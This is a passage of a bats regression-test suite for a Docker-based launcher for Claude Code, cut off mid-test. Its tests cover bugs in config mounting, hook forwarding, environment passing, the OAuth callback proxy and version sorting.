#!/usr/bin/env bats
# ─────────────────────────────────────────────────────────────────────────────
# REGRESSION REGISTRY
#
# One canonical test per bug that ever shipped. Every test is named by the
# version that fixed it plus a short description. Each test is mutation-tested:
# reverting the fix in bin/cleat MUST cause the test to fail.
#
# Rules:
#   1. Every entry references the version that introduced AND fixed the bug.
#   2. Every test reproduces the exact input conditions that triggered it.
#   3. Every test asserts the fix, not just that the code runs.
#   4. If the bug cannot be caught at unit level, the test lives here as a
#      stub with a `skip` pointing to the smoke/integration file that covers it.
#   5. Never delete a regression test. Bugs come back.
# ─────────────────────────────────────────────────────────────────────────────

load "../setup"
load "../lib/handoff_helpers"

setup() {
  _common_setup
  use_docker_stub
  source_cli

  # Neutralize side effects so we only test the regression behavior
  _host_clip_cmd() { echo ""; }
  check_for_update() { true; }
  check_drift() { true; }
  _resolve_config_drift() { true; }
  show_first_run_tip() { true; }

  # Use isolated config dir so tests don't touch real host
  CLEAT_CONFIG_DIR="$TEST_TEMP/cleat-config"
  CLEAT_GLOBAL_CONFIG="$CLEAT_CONFIG_DIR/config"
  CLEAT_GLOBAL_ENV="$CLEAT_CONFIG_DIR/env"
  _first_run_tip_file="$CLEAT_CONFIG_DIR/.tip-shown"
  mkdir -p "$CLEAT_CONFIG_DIR"
}

teardown() {
  rm -rf $CLEAT_RUN_DIR/cleat-project-*/settings 2>/dev/null || true
  rm -rf $CLEAT_RUN_DIR/cleat-project-*/hooks 2>/dev/null || true
  rm -rf $CLEAT_RUN_DIR/cleat-project-*/clip 2>/dev/null || true
  hb_teardown_pids 2>/dev/null || true
  # A race test that failed says what its racing command printed and how far the
  # handshake got. One of these failed once on a CI runner and passed in 300
  # local runs, and its log held only the assertion, so the next one has to
  # explain itself. Quiet for every test that passes.
  if [[ -z "${BATS_TEST_COMPLETED:-}" && -f "${TEST_TEMP:-}/race.out" ]]; then
    local esc; esc="$(printf '\033')"
    echo "# the racing command printed:"
    sed "s/${esc}\[[0-9;]*m//g" "$TEST_TEMP/race.out" 2>/dev/null | sed 's/^/#   /'
    echo "# handshake: hooked=$([[ -e "$TEST_TEMP/race.hooked" ]] && echo y || echo n)" \
      "waiting=$([[ -e "$TEST_TEMP/race.waiting" ]] && echo y || echo n)" \
      "done=$([[ -e "$TEST_TEMP/race.done" ]] && echo y || echo n)"
  fi
  _common_teardown
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.13.0: the startup summary's "Project:" row always claimed the project was
# mounted at "→ /workspace". That's a lie under the docker cap: that cap mounts
# the project at its HOST path and sets the container workdir there (so $(pwd)
# and `docker run -v $(pwd)` resolve on the host daemon, see the docker-cap
# mount block). The row now branches: host path "(same path, sandboxed)" under
# the docker cap, "→ /workspace" otherwise.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.13.0: summary Project row is truthful under the docker cap" {
  ACTIVE_CAPS=(docker)
  run _print_summary_block "cleat-x-12345678" "$HOME/proj"
  assert_output --partial "(same path, sandboxed)"
  refute_output --partial " /workspace"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.13.0: Claude greeted users with "Configuration Error / The configuration
# file at /home/coder/.claude.json contains invalid JSON ... Unexpected EOF" at
# startup, intermittently. Root cause: Cleat mounted the single host
# ~/.claude.json WHOLE and READ-WRITE into every container. Since every
# container runs at CWD /workspace, parallel/interrupted Claude writes to the
# same shared host file truncated it, and all projects also shared
# projects["/workspace"] (trust/MCP/allowedTools bled across unrelated repos).
#
# Fix: build a per-project, persistent ~/.claude.json (host global keys as base
# + this project's own /workspace block) and mount THAT. The container never
# writes the host file, so the corruption race and the bleed are gone by
# construction. The regression guard: the container's .claude.json bind SOURCE
# must be the per-project store, never the shared host file.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.13.0: container mounts an isolated .claude.json, not the shared host file" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  echo '{"oauthAccount":{"emailAddress":"a@b.com"}}' > "${HOME}/.claude.json"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"

  # A .claude.json is mounted onto the canonical container path…
  run assert_docker_run_has "$cname" ":/home/coder/.claude.json"
  assert_success
  # …from the per-project store, NOT the shared host file (the bug).
  run assert_docker_run_has "$cname" "cleat/projects/"
  assert_success
  run assert_docker_run_lacks "$cname" "${HOME}/.claude.json:/home/coder/.claude.json"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.5.1: cmd_claude did not set _RESOLVED_PROJECT, so hook bridge
# couldn't find project-level hooks. Silent failure in production, invisible
# to tests because `set -u` was stripped.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.5.1: cmd_claude sets _RESOLVED_PROJECT" {
  mkdir -p "$TEST_TEMP/project/.claude"
  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"x"}]}]}}' \
    > "$TEST_TEMP/project/.claude/settings.json"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  # Container must also "exist" so cmd_claude's drift-recreate fallback
  # doesn't run cmd_run (which would mask a missing _RESOLVED_PROJECT assignment).
  mock_docker_ps_a "$cname"
  exec_claude() { return 0; }

  _RESOLVED_PROJECT=""
  cmd_claude "$TEST_TEMP/project"

  [[ "$_RESOLVED_PROJECT" == "$TEST_TEMP/project" ]] || {
    echo "REGRESSION: _RESOLVED_PROJECT='$_RESOLVED_PROJECT' expected '$TEST_TEMP/project'"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.5.1: Hook settings overlay stripped all hooks instead of replacing
# command with forwarder. Project hooks never fired.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.5.1: hook overlay replaces command with forwarder (not strip)" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mkdir -p "${HOME}/.claude"
  cat > "${HOME}/.claude/settings.json" << 'EOF'
{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"my-host-hook"}]}]}}
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  local overlay="$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  [[ -f "$overlay" ]] || { echo "REGRESSION: overlay not created"; return 1; }

  # Must contain forwarder command, not be empty and not contain original
  run jq -r '.hooks.Stop[0].hooks[0].command' "$overlay"
  assert_output "cat >> /var/log/cleat/events.jsonl"

  : > "${HOME}/.claude/settings.json" 2>/dev/null || true
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.0: Hook bridge replayed old events on every start. Any events left
# in /var/log/cleat/events.jsonl from a prior session re-executed on restart.
# Fix: _hook_bridge_watcher reads the file's current byte size at startup and
# only tails bytes that appear AFTER that offset.
#
# This test used to grep the function body for `byte_offset=... wc -c`. The
# start offset became a stat in v1.5.4 (a `wc -c <` opened a FIFO the box
# swapped in), so it now drives the bridge instead: two events from a prior
# session, one after the start, and only the new one reaches a hook.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.0: hook bridge skips pre-existing events at startup" {
  local spool="$TEST_TEMP/hooks-v060/events.jsonl" processed="$TEST_TEMP/processed-v060" bpid i
  mkdir -p "${spool%/*}"
  echo '{"hook_event_name":"Stop","_cleat_ts":"old1"}' > "$spool"
  echo '{"hook_event_name":"Stop","_cleat_ts":"old2"}' >> "$spool"
  _execute_host_hook_bg() { echo "$1" >> "$processed"; }
  _hook_bridge_watcher "$spool" "$TEST_TEMP" >/dev/null 2>&1 3>&- &
  bpid=$!
  sleep 0.5
  echo '{"hook_event_name":"Stop","_cleat_ts":"new1"}' >> "$spool"
  i=0
  while ! grep -q new1 "$processed" 2>/dev/null && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
  kill "$bpid" 2>/dev/null || true
  wait "$bpid" 2>/dev/null || true
  run grep -c new1 "$processed"
  assert_output "1"
  run grep -c old "$processed"
  assert_output "0"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.0: Project overlay created .claude/ as root on host when directory
# didn't exist, because docker created the bind mount source.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.0: skip project overlay when .claude/ missing on host" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  # .claude/ intentionally missing

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  # Must NOT mount project settings overlay at /workspace/.claude/settings.json
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
  assert_success
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.local.json"
  assert_success

  [[ ! -d "$TEST_TEMP/project/.claude" ]] || {
    echo "REGRESSION: .claude/ created on host by cleat"
    return 1
  }

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.1: Browser bridge pre-initialized last_ts with the current file's
# mtime to skip stale URLs. Same-second writes had identical mtime and were
# silently dropped. Fix: delete stale file entirely at watcher startup, then
# track the empty-state as last_ts="". A new write has cur_ts != "" which
# triggers detection regardless of same-second collision.
#
# This test checks the function body structurally: the first operation in
# _browser_watcher after local declarations must be `rm -f "$bridge_file"`
# (not a pre-init of last_ts from the stale file's stat output).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.1: browser bridge removes stale file at startup" {
  # Behavioral: a bridge file left by a PRIOR session must be swept before the
  # poll loop can claim it, so a stale URL is never opened on the host. The
  # sweep now lives in a shared helper, so grepping the watcher body for the rm
  # proved nothing about whether it still happens.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf '%s' "https://example.com/stale" > "$dir/.browser-open"
  touch -t 202001010000 "$dir/.browser-open"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 2
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ ! -e "$dir/.browser-open" ] || {
    echo "REGRESSION: a stale .browser-open survived watcher startup"; return 1; }
  [ ! -f "$TEST_TEMP/opened.log" ] || {
    echo "REGRESSION: a stale URL from a prior session was opened on the host"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.2: docker run/start failures were shown as "Container failed to
# start" with no reason. Docker's stderr was swallowed by 2>&1 redirection.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.2: docker run failure surfaces docker stderr" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  export DOCKER_EXIT_CODE=125
  export DOCKER_STDERR="Error response from daemon: Conflict. The container name \"/test\" is already in use"

  run cmd_run "$TEST_TEMP/project"
  assert_failure

  # The exact docker stderr message must appear in the output
  assert_output --partial "Conflict"
  assert_output --partial "already in use"

  unset DOCKER_EXIT_CODE DOCKER_STDERR
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.2: Settings overlay directory was not cleaned on cmd_run after rm,
# causing stale overlays from a previous container to contaminate the new one.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.2: cmd_run wipes stale settings overlay dir" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  # Seed stale state from a previous container
  local overlay_dir="$CLEAT_RUN_DIR/${cname}/settings"
  mkdir -p "$overlay_dir"
  echo '{"stale":true}' > "$overlay_dir/settings.json"
  echo '{"stale":true}' > "$overlay_dir/stale-file-from-prior-run.json"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # The stale file from the prior run must be gone
  [[ ! -f "$overlay_dir/stale-file-from-prior-run.json" ]] || {
    echo "REGRESSION: stale overlay file from prior run was not wiped"
    return 1
  }

  # The current settings.json must be the new one, not the stale marker
  run jq -e '.stale // empty' "$overlay_dir/settings.json"
  assert_failure  # no .stale field in new file

  rm -rf "$overlay_dir" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.2: Quoted tilde in summary block showed '~' literally instead of
# collapsing $HOME to ~. Fix used intermediate variable to avoid word splitting.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.2: summary block shows ~ without quotes for home-relative path" {
  local real_home="$HOME"
  HOME="$TEST_TEMP/fakehome"
  mkdir -p "$HOME/Workspaces/my-proj"

  ACTIVE_CAPS=()
  run _print_summary_block "cleat-test-12345678" "$HOME/Workspaces/my-proj"

  # Path must collapse to ~/Workspaces/my-proj, not '~'/Workspaces or $HOME/...
  assert_output --partial "~/Workspaces/my-proj"
  refute_output --partial "'~'"
  refute_output --partial "$HOME/Workspaces"

  HOME="$real_home"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: exec_claude called docker exec with only HOME and PATH. Env vars
# resolved from .cleat.env were passed at docker run but not at exec time.
# Containers restarted via start/resume did not see updated env values.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: exec_claude passes resolved env args to docker exec" {
  _RESOLVED_ENV_ARGS=(-e "DATABASE_URL=postgres://localhost/mydb" -e "API_KEY=secret")
  run exec_claude "cleat-test-ctr" --dangerously-skip-permissions
  run assert_docker_exec_has "DATABASE_URL=postgres://localhost/mydb"
  assert_success
  run assert_docker_exec_has "API_KEY=secret"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_shell didn't call resolve_env_args and didn't pass env to
# docker exec, so `cleat shell && echo $DATABASE_URL` showed empty.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_shell passes .cleat.env vars to docker exec" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  cat > "$TEST_TEMP/project/.cleat.env" << 'EOF'
DATABASE_URL=postgres://localhost/mydb
API_KEY=sk-test-123
EOF
  cat > "$TEST_TEMP/project/.cleat" << 'EOF'
[caps]
env
EOF

  run cmd_shell "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "DATABASE_URL=postgres://localhost/mydb"
  assert_success
  run assert_docker_exec_has "API_KEY=sk-test-123"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_shell used only `-e HOME=/home/coder` and did not pass PATH.
# ~/.local/bin was not on the container shell's PATH.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_shell sets PATH with /home/coder/.local/bin" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  run cmd_shell "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "PATH="
  assert_success
  run assert_docker_exec_has "/home/coder/.local/bin"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_login didn't call resolve_env_args. Custom API endpoints or
# credentials in .cleat.env weren't available during authentication.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_login passes .cleat.env vars to docker exec" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  cat > "$TEST_TEMP/project/.cleat.env" << 'EOF'
ANTHROPIC_BASE_URL=https://custom.api.example.com
EOF
  cat > "$TEST_TEMP/project/.cleat" << 'EOF'
[caps]
env
EOF

  run cmd_login "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "ANTHROPIC_BASE_URL=https://custom.api.example.com"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: _parse_env_file used `while read -r line` without `|| [[ -n $line ]]`,
# skipping the last line of a file with no trailing newline.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: _parse_env_file reads last line without trailing newline" {
  printf 'FIRST=one\nLAST=two' > "$TEST_TEMP/envfile"
  run _parse_env_file "$TEST_TEMP/envfile"
  assert_success
  assert_line --index 0 "FIRST=one"
  assert_line --index 1 "LAST=two"
  [[ "${#lines[@]}" -eq 2 ]] || {
    echo "REGRESSION: expected 2 lines, got ${#lines[@]}"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: Env summary line was omitted when a .cleat.env existed but had
# only comments (count=0). Users couldn't tell if the file was being read.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: env summary shows 0 count when file has only comments" {
  ACTIVE_CAPS=(env)
  mkdir -p "$TEST_TEMP/project"
  cat > "$TEST_TEMP/project/.cleat.env" << 'EOF'
# just comments
# another comment
EOF
  run _env_summary_inline "$TEST_TEMP/project"
  assert_output --partial "Env:"
  assert_output --partial "0 from .cleat.env"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.4: OAuth callback proxy used socat default TCP (127.0.0.1) but
# Node.js binds localhost to ::1. Every callback was Connection Refused.
# Fix: try TCP6 first, fall back to TCP.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.4: the callback proxy forwards TCP6 first with ignoreeof" {
  # Was four separate `declare -f` source greps, every one of which passed
  # while the forward was completely broken. This asserts on the argv socat
  # actually receives instead.
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
printf '%s\n' "\$@" > "$TEST_TEMP/socat.argv"
exit 0
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45001 mybox "$TEST_TEMP/plog"
  run cat "$TEST_TEMP/socat.argv"
  assert_output --partial "TCP-LISTEN:45001"
  assert_output --partial "bind=127.0.0.1"
  # Inside a SYSTEM: parameter both ',' and ':' are socat separators, so the
  # exact escaped words are what must reach socat, not merely the substrings.
  assert_output --partial 'SYSTEM:docker exec -i mybox socat -\,ignoreeof TCP6\:localhost\:45001'
  assert_output --partial '|| docker exec -i mybox socat -\,ignoreeof TCP\:localhost\:45001'

  local argv; argv="$(cat "$TEST_TEMP/socat.argv")"
  local before="${argv%%TCP6*}"
  local t6=${#before}
  local t4
  t4=$(printf '%s' "$argv" | grep -bo 'TCP\\*:localhost' | grep -v TCP6 | head -1 | cut -d: -f1)
  [ -n "$t4" ] || { echo "REGRESSION: IPv4 fallback missing"; return 1; }
  [ "$t6" -lt "$t4" ] || { echo "REGRESSION: TCP6 must precede the TCP fallback"; return 1; }
}

@test "regression v0.6.4: the python proxy rewrites keep-alive to close before forwarding" {
  # Behavioral: run the real python backend (socat masked off PATH) with a stub
  # container that captures what it is handed, send a keep-alive request, and
  # assert the forwarded request carries Connection: close.
  command -v python3 >/dev/null 2>&1 || skip "python3 not available"
  mkdir -p "$TEST_TEMP/nosocat4"
  local b
  for b in bash date cat sleep python3; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat4/$b"; done
  cat > "$TEST_TEMP/nosocat4/docker" <<EOF
#!/usr/bin/env bash
cat > "$TEST_TEMP/forwarded.req"
printf 'HTTP/1.1 302 Found\r\nLocation: /\r\nContent-Length: 0\r\n\r\n'
EOF
  chmod +x "$TEST_TEMP/nosocat4/docker"
  PATH="$TEST_TEMP/nosocat4" _auth_callback_proxy 45005 mybox "$TEST_TEMP/plog5" &
  local ppid=$!
  local i connected=0
  for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
    if exec 9<>/dev/tcp/127.0.0.1/45005 2>/dev/null; then connected=1; break; fi
    sleep 0.3
  done
  [ "$connected" = 1 ] || { kill "$ppid" 2>/dev/null; echo "python proxy never bound"; return 1; }
  printf 'GET /callback?code=x HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n' >&9
  _portable_timeout 5 cat <&9 >/dev/null 2>&1 || true
  exec 9<&- 2>/dev/null || true
  wait "$ppid" 2>/dev/null || true
  run cat "$TEST_TEMP/forwarded.req"
  assert_output --partial "Connection: close"
  refute_output --partial "keep-alive"
}

@test "regression v0.6.4: the socat proxy retries a busy bind" {
  # A bind refused with exit 1 must be retried, not abandoned.
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
n=\$(cat "$TEST_TEMP/attempts" 2>/dev/null || echo 0); n=\$((n + 1)); echo "\$n" > "$TEST_TEMP/attempts"
[ "\$n" -ge 2 ] && exit 0
exit 1
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45004 mybox "$TEST_TEMP/plog4"
  run cat "$TEST_TEMP/attempts"
  assert_output "2"
  run cat "$TEST_TEMP/plog4"
  assert_output --partial "bind failed, retrying"
}

@test "regression v1.5.0: the callback proxy actually forwards, it is not an EXEC no-op" {
  # socat's EXEC address strips the quotes and splits on whitespace without a
  # shell, so `EXEC:sh -c '...'` ran `docker` with no arguments and every
  # callback came back EMPTY on any host that HAS socat. Hosts without it took
  # the python branch, which works, which is why this hid. Drive a real
  # loopback request through the real socat with a stub docker standing in for
  # the container.
  command -v socat >/dev/null 2>&1 || skip "socat is not installed on this host"
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/docker" <<'DOCKEOF'
#!/usr/bin/env bash
# Answer ONLY the exact exec line the forward must produce, and REFUSE the
# IPv6 leg so the `||` IPv4 fallback has to survive socat's parsing as well.
# A stub that answered any argv passed against a command socat had truncated
# at the first unescaped colon (the box received `socat -,ignoreeof TCP6` and
# nothing after it). That was a real false green.
[ "$1" = exec ] && [ "$2" = -i ] && [ "$3" = mybox ] && [ "$4" = socat ] && [ "$5" = "-,ignoreeof" ] || exit 1
case "$6" in
  TCP6:localhost:45002) exit 1 ;;
  TCP:localhost:45002)  printf 'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK' ;;
  *) exit 1 ;;
esac
DOCKEOF
  chmod +x "$TEST_TEMP/bin/docker"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45002 mybox "$TEST_TEMP/plog2" &
  local ppid=$!
  local i connected=0
  for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
    if exec 9<>/dev/tcp/127.0.0.1/45002 2>/dev/null; then connected=1; break; fi
    sleep 0.3
  done
  [ "$connected" = 1 ] || { kill "$ppid" 2>/dev/null; echo "proxy never bound the port"; return 1; }
  printf 'GET /callback?code=x HTTP/1.0\r\n\r\n' >&9
  local reply; reply="$(_portable_timeout 3 cat <&9)"
  exec 9<&- 2>/dev/null || true
  kill "$ppid" 2>/dev/null || true; wait "$ppid" 2>/dev/null || true
  case "$reply" in
    *OK*) : ;;
    *) echo "REGRESSION: the forward returned nothing usable: '$reply'"; return 1 ;;
  esac
}


# ─────────────────────────────────────────────────────────────────────────────
# v0.6.5: cmd_run wrote empty {} overlay and bind-mounted to
# /workspace/.claude/settings.json for files that didn't exist on host.
# Fails on macOS Docker Desktop virtiofs ("outside of rootfs" error).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.5: cmd_run skips overlay mount for missing host files" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project/.claude"
  # .claude/ exists but neither settings.json nor settings.local.json

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
  assert_success
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.local.json"
  assert_success

  # And no empty overlay file should have been created (the broken path wrote `{}`)
  [[ ! -f "$CLEAT_RUN_DIR/${cname}/settings/project-settings.json" ]] || {
    echo "REGRESSION: empty overlay file created for non-existent host file"
    return 1
  }
  [[ ! -f "$CLEAT_RUN_DIR/${cname}/settings/project-settings.local.json" ]] || {
    echo "REGRESSION: empty overlay file created for non-existent host file"
    return 1
  }

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.5: docker run failure could leave a partial container that collided
# with the next attempt's name. Fix: docker rm -f on failure.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.5: cmd_run cleans up partial container on docker run failure" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  export DOCKER_EXIT_CODE=125
  export DOCKER_STDERR="OCI runtime create failed"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_failure

  # A docker rm -f call must have been issued for the failed container
  grep -qE "^docker rm -f $cname" "$DOCKER_CALLS" || {
    echo "REGRESSION: cmd_run did not clean up partial container on failure"
    echo "Docker calls:"
    cat "$DOCKER_CALLS"
    return 1
  }

  unset DOCKER_EXIT_CODE DOCKER_STDERR
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: --env, --env-file, --cap global flags only applied to start/run/
# resume/claude. Users passing `cleat --env X shell` got no env.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_shell resolves env args (not just hardcoded HOME/PATH)" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"

  # Check that resolve_env_args is called inside cmd_shell by looking at the function body
  local body
  body="$(declare -f cmd_shell)"
  echo "$body" | grep -q 'resolve_env_args' || {
    echo "REGRESSION: cmd_shell must call resolve_env_args"
    return 1
  }
  echo "$body" | grep -q '_RESOLVED_ENV_ARGS' || {
    echo "REGRESSION: cmd_shell must pass _RESOLVED_ENV_ARGS to docker exec"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.6.3: cmd_login had the same bug as cmd_shell.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.6.3: cmd_login resolves env args" {
  local body
  body="$(declare -f cmd_login)"
  echo "$body" | grep -q 'resolve_env_args' || {
    echo "REGRESSION: cmd_login must call resolve_env_args"
    return 1
  }
  echo "$body" | grep -q '_RESOLVED_ENV_ARGS' || {
    echo "REGRESSION: cmd_login must pass _RESOLVED_ENV_ARGS to docker exec"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# Stale-mount detection: after macOS reboot /tmp is cleared and SSH agent
# socket path rotates. Stopped containers have old bind mounts baked in and
# cannot start. cmd_start must detect this and recreate silently.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression stale-mount: cmd_start recreates container when overlay dir missing" {
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  # Simulate: container exists (stopped), overlay dir is missing (stale after reboot)
  mock_docker_ps_a "$cname"
  is_running() { return 1; }
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" 2>/dev/null || true

  run cmd_start "$TEST_TEMP/project"

  # cmd_start should have removed the stale container and called cmd_run to recreate
  grep -qE "^docker rm -f $cname" "$DOCKER_CALLS" || {
    echo "REGRESSION: stale container not removed"
    cat "$DOCKER_CALLS"
    return 1
  }
  grep -qE "^docker run " "$DOCKER_CALLS" || {
    echo "REGRESSION: container not recreated after stale detection"
    cat "$DOCKER_CALLS"
    return 1
  }

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# Update cache corruption: check_for_update read a non-numeric last_check
# from a corrupted cache file and passed it directly to an arithmetic
# expression. Under set -u, bash treats `(( garbage ... ))` as an unbound
# variable reference and aborts the CLI. Discovered during strict-mode
# hardening in the test suite (April 2026). Fix: validate last_check is
# a non-negative integer before the arithmetic.
# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# latest_remote_tag: must numerically sort semver versions.
# Lexical sort would break v0.10.0 < v0.9.0 → "0.10.0" < "0.9.0" as strings.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: latest_remote_tag sorts 0.10.0 > 0.9.0 numerically" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

  # Git stub that returns unsorted tags including double-digit minor versions
  cat > "$TEST_TEMP/bin/git" << 'EOF'
#!/bin/sh
if [ "$1" = "-C" ] && [ "$3" = "ls-remote" ]; then
  cat << 'TAGS'
abc	refs/tags/v0.6.5
def	refs/tags/v0.9.0
abc	refs/tags/v0.10.0
xyz	refs/tags/v0.9.1
111	refs/tags/v0.10.1
TAGS
fi
EOF
  chmod +x "$TEST_TEMP/bin/git"
  export PATH="$TEST_TEMP/bin:$PATH"

  run latest_remote_tag
  assert_success
  assert_output "0.10.1"
}

@test "regression: latest_remote_tag filters non-semver tags" {
  REPO_DIR="$TEST_TEMP"
  mkdir -p "$TEST_TEMP/.git" "$TEST_TEMP/bin"

